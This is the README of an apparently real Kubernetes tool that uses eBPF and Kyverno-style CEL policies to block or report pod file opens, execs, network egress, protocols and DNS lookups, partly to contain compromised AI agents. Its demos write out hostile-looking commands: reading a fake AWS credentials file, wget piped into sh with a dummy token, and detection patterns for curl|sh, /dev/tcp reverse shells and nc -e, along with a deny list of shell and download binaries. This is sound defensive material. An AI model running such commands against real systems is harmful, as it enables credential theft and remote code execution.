# Runtime For Kyverno

**🎉 Kyverno-style CEL policies for eBPF runtime enforcement.**

[![CI](https://github.com/nirmata/runtime/actions/workflows/ci.yml/badge.svg)](https://github.com/nirmata/runtime/actions/workflows/ci.yml)
[![Kubernetes](https://img.shields.io/badge/Kubernetes-1.29+-326CE5?logo=kubernetes&logoColor=white)](https://kubernetes.io/)
[![Go](https://img.shields.io/badge/Go-1.26+-00ADD8?logo=go&logoColor=white)](https://golang.org/)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

## 🚀 What is Runtime For Kyverno?

**Nirmata Runtime** monitors and enforces runtime behaviors with Kyverno-style CEL policies using eBPF. It provides a per-node DaemonSet that attaches eBPF programs to the pods selected by a cluster-scoped `RuntimePolicy`.

The `RuntimePolicy` governs five kinds of workload behavior:

1. the files a process opens,
2. the binaries it executes,
3. the destinations it sends traffic to,
4. the application protocols it speaks, and
5. the DNS names it resolves.

Decisions are made in the kernel, so a denied operation never completes.

Like Kyverno, everything in Runtime is Kubernetes-native: policies are custom resources defined in this project and support CEL (Common Expressions Language); findings are written as [OpenReports](https://openreports.io) `Report` objects in the offending pod's namespace, per-node state and conditions live in the policy's `status`, and counters are exposed to Prometheus.

## 🔥 Why Runtime for Kyverno?

As applications become AI-enabled, there is an immediate need to easily monitor and enforce runtime behaviors. Nirmata Runtime complements admission controllers, native RBAC and network policies, and AI gateways by providing an easy to use runtime tool to restrict AI workloads to a bounded set of behaviors and detect rogue agents.

- **Admission Controllers checks the spec; Runtime checks the behavior.** Kyverno at admission validates what a pod *declares* before it starts. Runtime enforces what the running process actually *does* — the files it opens, the binaries it execs, the addresses it contacts — after admission has already said yes.

- **What your CNI can't tell you.** NetworkPolicy decides who may reach whom; it does not know that `port: 443` might carry SSH, an h2c tunnel, or a custom protocol instead of TLS. `protocol` classifies each flow from its first data segment, independent of the declared port, and joins `exec`, `open`, and `network` in one policy object evaluated by one daemon — a cross-domain assertion no CNI expresses, with each finding attributed to the pod and container it came from, including the process for `exec`/`open` findings. Connectivity, identity-based policy, FQDN egress, ingress, and encryption stay with the CNI; see [why a runtime layer](docs/users/why-runtime.md) for the full split.

- **Blocks, not just alerts.** Runtime detection tells you a sensitive file was read. `mode: enforce` returns `-EPERM` from a kernel hook (BPF-LSM, or `fmod_ret` on `security_file_open`), so the read never happens. `mode: monitor` gives you the detection workflow first, with the same policy object.

- **One small CRD, Kyverno CEL, deliberately narrow.** Runtime covers five behaviors with one `RuntimePolicy` CRD, allow and deny lists, and the same CEL libraries used across Kyverno — including deny lists fetched from ConfigMaps or HTTP feeds at evaluation time.

## ✨ Key Features

- **Five behaviors**: `open` (file paths), `exec` (binary paths), `network` (addresses,
  CIDRs, domain names, and cluster Service names), and `protocol` (the application
  protocol a flow speaks) can be enforced or observed, in any combination in one policy.
  A fifth, `dns` (the names a workload resolves), only ever observes: pairing it with
  `mode: enforce` is refused, because blocking a destination named by domain is what a
  `network` behavior does.

- **Enforce or monitor**: `spec.mode` is per policy, so one policy can block a workload
  while another reports on it.

- **Readable findings**: a `monitorFilter` is a per-observation CEL predicate deciding
  which monitor-mode findings are reported, so a discovery policy can watch broadly and
  still produce a Report someone will read.

- **Default deny with allow-lists**: `deny.values: ["*"]` flips a behavior to
  deny-all-except-allowed.

- **CEL-powered rules**: literal `values`, CEL `expression`, reusable `spec.variables`,
  and the Kyverno `resource`, `http`, and `json` libraries alongside the Kubernetes CEL
  libraries.

- **Kubernetes-native output**: OpenReports `Report` objects, per-node `status.nodes`
  shards with `Applied` and `TargetsValid` conditions, and Prometheus counters.

- **Selector scoping**: `podSelector` and `namespaceSelector` label selectors, cluster-wide;
  omitting either selects everything, and an `enforce`-mode policy must set one of them.

- **Periodic re-evaluation**: `evaluationInterval` re-runs the policy's expressions, so
  an externally sourced deny list stays current without editing the policy.

🚨 **WARNING**: This project is pre-1.0 and the API is `v1alpha1`. Here are some known limitations:

- Egress is keyed on IPv4 and IPv6 destination addresses, but a domain name is resolved from A records only, so it covers IPv4 addresses alone: a deny on a domain does not block that destination over IPv6.
- File `open` and process `exec` use the BPF-LSM hooks where `bpf` appears in `/sys/kernel/security/lsm`, and a `fmod_ret` fallback otherwise. Only on a BPF-LSM node is an exec also matched against your `open` rules — see [platforms](docs/users/platforms.md).
- `network`, `protocol`, `open`, and `exec` observations come from eBPF counters that the daemon drains on a poll interval rather than from a stream of events, so a finding can lag the behavior and carries counts rather than ordering. A `dns` question is streamed as it happens.
- Exceptions are not yet supported.

## 🏃 Quick Start

### Prerequisites

- A Kubernetes cluster on Linux nodes, plus `kubectl`, `helm`, and `git`. A stock
  [kind](https://kind.sigs.k8s.io/) cluster works.

- Network egress enforcement and observation require only a cgroup v2 host and BPF
  support; a stock kind cluster on a Linux host qualifies. That, plus egress from the
  cluster to the address each sample below probes, is all they need.

- File `open` and process `exec` enforcement need BTF, plus either BPF-LSM or, for the
  `fmod_ret` fallback, kernel 5.7 or later with the BPF JIT on x86-64 or arm64. Which
  managed node images have BPF-LSM is listed in [platforms](docs/users/platforms.md).

### Install

```bash
helm install kyverno-runtime oci://ghcr.io/nirmata/charts/kyverno-runtime \
  --namespace kyverno-runtime --create-namespace
```

```bash
kubectl get pods -n kyverno-runtime
```

To build from source instead, or to install a daemon image you built yourself, see
[installation](./docs/users/installation.md).

### Block an address

Nothing to clone and no server to run. Start a client:

```bash
kubectl run egress-client --image=busybox:1.36 --labels=app=egress-client \
  --restart=Never --command -- sleep 3600
kubectl wait --for=condition=Ready pod/egress-client --timeout=90s
```

`8.8.8.8` is Google Public DNS. It is used here only because it is a recognizable address
that answers from anywhere with egress, so the sample needs nothing of your own running —
blocking a public resolver is a demonstration, not a recommendation. The client can reach
it:

```bash
kubectl exec egress-client -- timeout 5 nslookup example.com 8.8.8.8
```

Deny that one address:

```bash
kubectl apply -f - <<'EOF'
apiVersion: runtime.nirmata.io/v1alpha1
kind: RuntimePolicy
metadata:
  name: block-address-sample
spec:
  mode: enforce
  podSelector:
    matchLabels:
      app: egress-client
  behaviors:
  - network:
      deny:
        values:
        - "8.8.8.8"
EOF
```

The same query now times out, because the packet is dropped in the kernel — while
everything else the pod does, cluster DNS included, keeps working:

```bash
kubectl exec egress-client -- timeout 5 nslookup example.com 8.8.8.8  # times out
kubectl exec egress-client -- nslookup kubernetes.default             # still resolves
```

No CNI, iptables rule, or sidecar is involved, and nothing about the pod spec changed. A
real policy names the destinations that matter to the workload, and can name them as domain
names or cluster Service names rather than literal addresses — see
[examples](docs/users/examples.md).

```bash
kubectl delete rpol block-address-sample
kubectl delete pod egress-client
```

### Contain a compromised agent

A prompt-injected agent does not need an exploit. It needs a shell, a downloader, and a
credential file someone left in reach. Start a stand-in for that agent, with a fake AWS
credentials file mounted in its home directory. The container runs `sleep` rather than a
shell, so it starts whether you apply the policy below before or after it:

```bash
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Secret
metadata:
  name: agent-aws
stringData:
  credentials: |
    aws_access_key_id=AKIAEXAMPLE
---
apiVersion: v1
kind: Pod
metadata:
  name: agent
  labels:
    app: agent
spec:
  containers:
  - name: agent
    image: busybox:1.36
    command: ["sleep", "3600"]
    volumeMounts:
    - name: aws
      mountPath: /root/.aws/credentials
      subPath: credentials
  volumes:
  - name: aws
    secret:
      secretName: agent-aws
EOF
kubectl wait --for=condition=Ready pod/agent --timeout=90s
```

Anything that gets a command into this pod can read the key, open a shell, and fetch a
payload:

```bash
kubectl exec agent -- cat /root/.aws/credentials
kubectl exec agent -- sh -c 'echo shell ok'
kubectl exec agent -- wget -q -T 5 -O /dev/null http://example.com && echo fetched
```

Deny the file and the three binaries an attacker reaches for first:

```bash
kubectl apply -f - <<'EOF'
apiVersion: runtime.nirmata.io/v1alpha1
kind: RuntimePolicy
metadata:
  name: contain-agent
spec:
  mode: enforce
  podSelector:
    matchLabels:
      app: agent
  behaviors:
  - open:
      deny:
        values:
        - /root/.aws/credentials
  - exec:
      deny:
        values:
        - /bin/sh
        - /bin/wget
        - /bin/nc
EOF
```

Allow a few seconds for the daemon to program the pod, then try again. The kernel returns
`EPERM`, so the file is never read and the binaries never start, even from `kubectl exec`:

```bash
kubectl exec agent -- cat /root/.aws/credentials               # Operation not permitted
kubectl exec agent -- sh -c 'echo shell ok'                    # exec /bin/sh: operation not permitted
kubectl exec agent -- wget -q -O /dev/null http://example.com  # exec /bin/wget: operation not permitted
kubectl exec agent -- ls /root/.aws                            # still lists "credentials"
```

Each denial is written to the pod's Report, with the path and the policy that blocked it.
Observations are polled and findings flushed every 10 seconds, so allow about 20 seconds;
the order of the results can vary:

```bash
kubectl get report kyverno-runtime-agent \
  -o jsonpath='{range .results[*]}{.message}{"\n"}{end}'
```

```text
enforced: open of /root/.aws/credentials was denied by policy contain-agent
enforced: exec of /bin/sh was denied by policy contain-agent
enforced: exec of /bin/wget was denied by policy contain-agent
```

Each value here is a whole path, matched as the kernel resolves it; ending a value in `/*`
covers a whole directory instead, so `/root/.aws/*` would also deny the `config` file that
usually sits beside `credentials`. A deny list names what you
know is dangerous; to allow only what the workload needs, see the default-deny
[exec allow-list](examples/files-and-processes/restrict-exec-allowlist/).

```bash
kubectl delete rpol contain-agent
```

### Catch a command by what it does

A deny list names binaries, but an attacker cares about what a command does, not which
binary runs it. `curl | sh`, `wget | sh`, and a `/dev/tcp` reverse shell all start a shell
the workload runs for legitimate reasons too, so denying the shell is not an option, and no
path list tells them apart.

Observe every exec instead, and let a CEL `monitorFilter` decide which ones are worth
reporting. The filter runs over each observation, command-line arguments included, so it
can match the shape of an attack rather than the name of a file:

```bash
kubectl apply -f - <<'EOF'
apiVersion: runtime.nirmata.io/v1alpha1
kind: RuntimePolicy
metadata:
  name: catch-pipe-to-shell
spec:
  mode: monitor
  podSelector:
    matchLabels:
      app: agent
  behaviors:
  - exec:
      deny:
        values: ["*"]
  monitorFilter:
    expressions:
    - name: exec-events-only
      expression: 'has(event.exec)'
    - name: download-and-run-or-reverse-shell
      expression: >-
        event.exec.argv.exists(a,
          a.matches("(curl|wget)[^|]*\\|\\s*(\\S*/)?(ba)?sh\\b") ||
          a.contains("/dev/tcp/") ||
          a.matches("\\bnc\\s.*\\s-e\\s")) ||
        (event.exec.argv.size() > 0 &&
          event.exec.argv[0].matches("(^|/)nc$") &&
          "-e" in event.exec.argv)
EOF
```

Run two ordinary commands, then a download piped into a shell that carries an API token:

```bash
kubectl exec agent -- ls /
kubectl exec agent -- sh -c 'echo hello'
kubectl exec agent -- sh -c \
  'wget -qO- -T 5 --header "Authorization: Bearer sk-live-4f9a8b7c6d5e" http://example.com/install.sh | sh'
```

Every one of those execs was observed, and only one is reported, with the full command line
that ran. Allow about 20 seconds:

```bash
kubectl get report kyverno-runtime-agent \
  -o jsonpath='{range .results[?(@.policy=="catch-pipe-to-shell")]}{.properties.argv}{"\n"}{end}'
```

```text
sh -c wget -qO- -T 5 --header "Authorization: REDACTED http://example.com/install.sh | sh
```

The token never reaches the Report. Every value written to a Report passes through a fixed
redaction step that replaces recognized credential shapes — bearer tokens, API keys, AWS key
IDs, JWTs — and prompt payloads, and no setting turns it off. A credential in another shape,
such as `curl -u user:password`, is not recognized, so try this with dummy values.

```bash
kubectl delete rpol catch-pipe-to-shell
kubectl delete pod agent
kubectl delete secret agent-aws
```

A filter works on every kind of observation and has the Kubernetes CEL libraries available.
This one reports only the connections that leave the cluster, using the `CIDR` library to
drop everything addressed to a private range:

```yaml
  behaviors:
  - network:
      deny:
        values: ["*"]
  monitorFilter:
    expressions:
    - name: leaves-the-cluster
      expression: >-
        has(event.net) &&
        !["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
          .exists(c, cidr(c).containsIP(event.net.destIP))
```

Both are runnable in full in
[catch-pipe-to-shell](examples/monitoring/catch-pipe-to-shell/) and
[report-external-egress](examples/monitoring/report-external-egress/). Every field a filter can
read is listed in the [CEL reference](docs/users/reference/cel.md#monitorfilter-expressions).

### See what a workload reaches for

Enforcement is half of it. The other half is finding out what a workload does that nobody
declared — a model provider it was never approved to call, an SDK nobody reviewed, an MCP
server not in the image contract. A `dns` behavior declares the names a workload is
*expected* to resolve and reports the rest, and it needs only the cgroup v2 host the
address sample already used:

```bash
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: dns-client
  labels:
    app: dns-client
spec:
  containers:
  - name: client
    image: busybox:1.36
    command: ["sh", "-c", "sleep 900"]
EOF
kubectl wait --for=condition=Ready pod/dns-client --timeout=90s
```

```bash
kubectl apply -f - <<'EOF'
apiVersion: runtime.nirmata.io/v1alpha1
kind: RuntimePolicy
metadata:
  name: report-unexpected-dns
spec:
  mode: monitor
  podSelector:
    matchLabels:
      app: dns-client
  behaviors:
  - dns:
      allow:
        values:
        - api.openai.com
        - api.anthropic.com
        - "*.openai.azure.com"
EOF
```

Resolve one approved provider and one that is not. The trailing dot makes each name
absolute, so exactly one question goes on the wire rather than one per `search` domain in
the pod's `/etc/resolv.conf`, and whether an answer comes back is irrelevant — the question
is the observation:

```bash
kubectl exec dns-client -- nslookup api.openai.com.  >/dev/null 2>&1
kubectl exec dns-client -- nslookup api.mistral.ai. >/dev/null 2>&1
```

Only the undeclared name is reported, attributed to the pod that asked for it. Questions
reach userspace as they happen and findings are flushed every 10 seconds, so allow about
that long:

```bash
kubectl get report kyverno-runtime-dns-client \
  -o jsonpath='{range .results[?(@.rule=="dns")]}{.properties.dnsName}{"\n"}{end}'
```

`api.mistral.ai` appears; `api.openai.com` does not.

```bash
kubectl delete rpol report-unexpected-dns
kubectl delete pod dns-client
```

The question crosses the wire in cleartext, so this works without touching the workload,
its TLS, or its trust store. What was *said* over that connection is not knowable here —
see [detecting shadow AI](docs/users/shadow-ai.md) for the signals that are, and the ones
that are not. The manifests above, with the full walkthrough, are in
[examples/shadow-ai/report-unexpected-dns/](examples/shadow-ai/report-unexpected-dns/).

Full walkthroughs: [network egress](docs/users/quickstart.md), including how to flip a
policy to `monitor` and read the resulting Report, plus
[file reads](examples/files-and-processes/deny-sensitive-file-access/) and
[process exec](examples/files-and-processes/restrict-exec-allowlist/).

## 📚 Documentation

### User Documentation

- **[Quickstart](docs/users/quickstart.md)** - kind cluster to a kernel-enforced egress block in under five minutes; runs on any Linux host
- **[Why a runtime layer](docs/users/why-runtime.md)** - what a gateway, a TLS proxy, admission control, and a CNI each cannot see, and what this leaves to them
- **[Concepts](docs/users/concepts.md)** - how enforcement works, allow and deny semantics, modes, scoping, and what monitor mode sees
- **[Installation](docs/users/installation.md)** - platform requirements, Helm chart values, daemon flags
- **[Platforms](docs/users/platforms.md)** - BPF-LSM support across EKS, GKE, AKS, and Bottlerocket, and what works without it
- **[Examples](docs/users/examples.md)** - the scenario catalog, grouped by feature
- **[Detecting shadow AI](docs/users/shadow-ai.md)** - the providers a workload resolves, the SDKs and model files it reads, the agent CLIs and MCP servers it launches, and what stays inside TLS
- **[Troubleshooting](docs/users/troubleshooting.md)** - why nothing is blocked, missing Reports, rejected targets
- **Reference** - [RuntimePolicy](docs/users/reference/runtimepolicy.md), [CEL](docs/users/reference/cel.md), [Metrics](docs/users/reference/metrics.md)

### Developer Documentation

- **[Development guide](docs/dev/DEVELOPMENT.md)** - building, testing, generated
  artifacts, CI
- **[Design document](docs/dev/DESIGN.md)** - architecture and design decisions

## Learn More

- 📖 **Examples**: every scenario under [examples/](examples/README.md) is a
  self-contained, CI-validated walkthrough

- 📚 **Spec reference**: [RuntimePolicy](docs/users/reference/runtimepolicy.md) for every
  field, condition, and documented limit
  
- 💻 **CEL**: [CEL reference](docs/users/reference/cel.md) for the expression contract and
  the available libraries

## 🤝 Contributing

Contributions are welcome. Start with **[CONTRIBUTING.md](CONTRIBUTING.md)** for how to
propose a change and get it reviewed, and
**[docs/dev/DEVELOPMENT.md](docs/dev/DEVELOPMENT.md)** for build and test mechanics, the
test layout, and how generated artifacts are regenerated. Sign your commits
(`git commit -s`). Bugs and feature requests go to
[GitHub issues](https://github.com/nirmata/runtime/issues).

Security vulnerabilities do not go to the issue tracker. Report them privately by the
process in **[SECURITY.md](SECURITY.md)**.

## 📄 License

Runtime is licensed under the [Apache License 2.0](LICENSE).

## 🔗 References

- [Common Expression Language (CEL)](https://github.com/google/cel-spec)
- [Kubernetes CEL libraries](https://kubernetes.io/docs/reference/using-api/cel/)
- [Kyverno CEL libraries](https://github.com/kyverno/sdk/tree/main/extensions/cel/libs)
- [OpenReports](https://openreports.io)
- [BPF LSM (Linux kernel documentation)](https://docs.kernel.org/bpf/prog_lsm.html)

---

<div align="center">

Built with ❤️ by the Nirmata team

[Report Bug](https://github.com/nirmata/runtime/issues) · [Request Feature](https://github.com/nirmata/runtime/issues)

</div>
